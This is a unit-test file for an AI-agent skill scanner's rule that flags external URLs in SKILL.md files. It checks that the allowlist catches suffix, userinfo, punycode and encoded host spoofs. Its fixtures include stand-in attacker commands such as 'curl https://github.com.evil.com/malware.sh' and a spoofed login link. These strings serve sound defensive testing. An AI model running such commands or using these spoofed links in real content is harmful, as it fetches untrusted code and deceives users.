/**
 * Unit tests for the markdown scanner's `md-external-url` safe-domain rule.
 * Asserts the allowlist resists suffix and userinfo host spoofing (#22766)
 * while keeping listed domains and their subdomains clean. Deterministic,
 * no live model.
 */

import type { IAgentRuntime } from "@elizaos/core";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AgentSkillsService } from "../services/skills";
import { MemorySkillStore } from "../storage";
import { scanSkillPackage } from "./index";
import { scanMarkdownSource } from "./markdown-scanner";

afterEach(() => {
	vi.unstubAllGlobals();
});

function flagsExternalUrl(
	source: string,
	additionalSafeDomains: ReadonlyArray<string> = [],
): boolean {
	return scanMarkdownSource(source, "SKILL.md", additionalSafeDomains).some(
		(finding) => finding.ruleId === "md-external-url",
	);
}

describe("markdown scanner md-external-url safe-domain allowlist", () => {
	it("flags a plainly external host (control)", () => {
		expect(flagsExternalUrl("Download from https://evil.com/x")).toBe(true);
	});

	it("does not flag a bare listed safe domain (control)", () => {
		expect(flagsExternalUrl("See https://github.com/a/b")).toBe(false);
		expect(
			flagsExternalUrl("Fetch https://raw.githubusercontent.com/o/r/main/f"),
		).toBe(false);
	});

	it("flags a registrable-suffix spoof of a safe domain (#22766)", () => {
		// `github.com.evil.com` is a distinct attacker-registered host, not a
		// subdomain of github.com; the old `\\b` lookahead treated it as safe.
		expect(flagsExternalUrl("curl https://github.com.evil.com/malware.sh")).toBe(
			true,
		);
		expect(
			flagsExternalUrl("curl https://raw.githubusercontent.com.attacker.net/p"),
		).toBe(true);
	});

	it("flags a userinfo phishing spoof that resolves to an external host (#22766)", () => {
		// The real host is `evil.com`; the safe-looking prefix is only userinfo.
		expect(
			flagsExternalUrl("curl https://raw.githubusercontent.com@evil.com/p"),
		).toBe(true);
		expect(flagsExternalUrl("open https://github.com@evil.com/login")).toBe(
			true,
		);
	});

	it("flags any URL that embeds userinfo even when the real host is safe", () => {
		// Deceptive display form; a documented safe-domain link never needs creds.
		expect(flagsExternalUrl("visit https://evil.com@github.com/x")).toBe(true);
	});

	it("flags password-only and empty userinfo on an otherwise safe host", () => {
		expect(
			flagsExternalUrl("visit https://:credential@github.com/x"),
		).toBe(true);
		expect(flagsExternalUrl("visit https://@github.com/x")).toBe(true);
	});

	it("treats subdomains of listed safe domains as safe (suffix semantics)", () => {
		expect(flagsExternalUrl("See https://gist.github.com/user/abc")).toBe(false);
		expect(flagsExternalUrl("Docs at https://en.wikipedia.org/wiki/X")).toBe(
			false,
		);
	});

	it("keeps safe bare URLs clean before terminal prose punctuation", () => {
		expect(flagsExternalUrl("See https://github.com.")).toBe(false);
		expect(flagsExternalUrl("See https://github.com., then continue")).toBe(
			false,
		);
		expect(flagsExternalUrl("See https://github.com, then continue")).toBe(false);
		expect(flagsExternalUrl("See https://github.com; then continue")).toBe(false);
		expect(flagsExternalUrl("See https://github.com!")).toBe(false);
		expect(flagsExternalUrl("See https://github.com:")).toBe(false);
		expect(flagsExternalUrl("See https://github.com...")).toBe(false);
		expect(flagsExternalUrl("See https://github.com…")).toBe(false);
		expect(flagsExternalUrl("See {https://github.com}")).toBe(false);
	});

	it("does not let terminal punctuation hide external or userinfo hosts", () => {
		expect(flagsExternalUrl("See https://github.com.evil.com.")).toBe(true);
		expect(flagsExternalUrl("See https://github.com.evil.com,")).toBe(true);
		expect(flagsExternalUrl("See https://github.com@evil.com!")).toBe(true);
		expect(flagsExternalUrl("See https://github.com@evil.com:")).toBe(true);
		expect(flagsExternalUrl("See https://evil.com/path;query,")).toBe(true);
	});

	it("honors additional safe domains and their subdomains", () => {
		expect(
			flagsExternalUrl("Fetch https://cdn.example.org/a", ["example.org"]),
		).toBe(false);
		expect(
			flagsExternalUrl("Fetch https://example.org.evil.com/a", ["example.org"]),
		).toBe(true);
	});

	it("is case-insensitive about the host when matching the allowlist", () => {
		expect(flagsExternalUrl("See https://GitHub.com/a/b")).toBe(false);
		expect(flagsExternalUrl("See https://GITHUB.COM.evil.com/a")).toBe(true);
	});

	it("uses the parsed host across ports, IPv6, punycode, encoding, and schemes", () => {
		expect(flagsExternalUrl("See HTTPS://github.com:443/a")).toBe(false);
		expect(flagsExternalUrl("See https://evil.com:443/a")).toBe(true);
		expect(flagsExternalUrl("See https://[::1]/a")).toBe(true);
		expect(flagsExternalUrl("See https://xn--githb-3ya.com/a")).toBe(true);
		expect(flagsExternalUrl("See https://%67ithub.com/a")).toBe(false);
		expect(flagsExternalUrl("See https://%67ithub.com.evil.com/a")).toBe(true);
		expect(flagsExternalUrl("See http://github.com.evil.com/a")).toBe(true);
	});

	it("surfaces a spoof as a warning at the installed-package scan boundary", () => {
		const report = scanSkillPackage(
			new Map([
				[
					"SKILL.md",
					{
						content:
							"---\nname: untrusted\ndescription: scanner boundary\n---\nVisit https://:credential@github.com/x",
						isText: true,
					},
				],
			]),
			"/skills/untrusted",
		);

		expect(report.status).toBe("warning");
		expect(report.findings).toEqual(
			expect.arrayContaining([
				expect.objectContaining({ ruleId: "md-external-url", severity: "warn" }),
			]),
		);
	});

	it("keeps a direct-URL install disabled when its SKILL.md uses password-only userinfo", async () => {
		vi.stubGlobal(
			"fetch",
			vi.fn(async () =>
				new Response(
					"---\nname: untrusted\ndescription: install boundary\n---\nVisit https://:credential@github.com/x",
					{ headers: { "content-type": "text/markdown" } },
				),
			),
		);
		const runtime = {
			getSetting: vi.fn(() => undefined),
			logger: {
				debug: vi.fn(),
				error: vi.fn(),
				info: vi.fn(),
				warn: vi.fn(),
			},
		} as unknown as IAgentRuntime;
		const service = await AgentSkillsService.start(runtime, {
			autoLoad: false,
			storage: new MemorySkillStore(),
		});

		try {
			await expect(
				service.installFromUrl("https://skills.example/untrusted.md", {
					slug: "untrusted",
				}),
			).resolves.toBe(true);
			expect(service.getSkillScanStatus("untrusted")).toBe("warning");
			expect(service.setSkillEnabled("untrusted", true)).toBe(false);
		} finally {
			await service.stop();
		}
	});

	it("keeps a direct-URL install enabled when a safe bare URL ends a clause", async () => {
		vi.stubGlobal(
			"fetch",
			vi.fn(async () =>
				new Response(
					"---\nname: trusted\ndescription: install boundary\n---\nVisit https://github.com. Then https://github.com., and finally https://github.com:",
					{ headers: { "content-type": "text/markdown" } },
				),
		),
	);
		const runtime = {
			getSetting: vi.fn(() => undefined),
			logger: {
				debug: vi.fn(),
				error: vi.fn(),
				info: vi.fn(),
				warn: vi.fn(),
			},
		} as unknown as IAgentRuntime;
		const service = await AgentSkillsService.start(runtime, {
			autoLoad: false,
			storage: new MemorySkillStore(),
		});

		try {
			await expect(
				service.installFromUrl("https://skills.example/trusted.md", {
					slug: "trusted",
				}),
			).resolves.toBe(true);
			expect(service.getSkillScanStatus("trusted")).toBeNull();
			expect(service.setSkillEnabled("trusted", true)).toBe(true);
		} finally {
			await service.stop();
		}
	});

	it("reports accurate finding metadata for a flagged spoof", () => {
		const findings = scanMarkdownSource(
			"line one\ncurl https://github.com.evil.com/x.sh",
			"docs/SKILL.md",
		);
		const finding = findings.find((f) => f.ruleId === "md-external-url");
		expect(finding).toBeDefined();
		expect(finding?.severity).toBe("warn");
		expect(finding?.file).toBe("docs/SKILL.md");
		expect(finding?.line).toBe(2);
		expect(finding?.evidence).toContain("github.com.evil.com");
	});
});
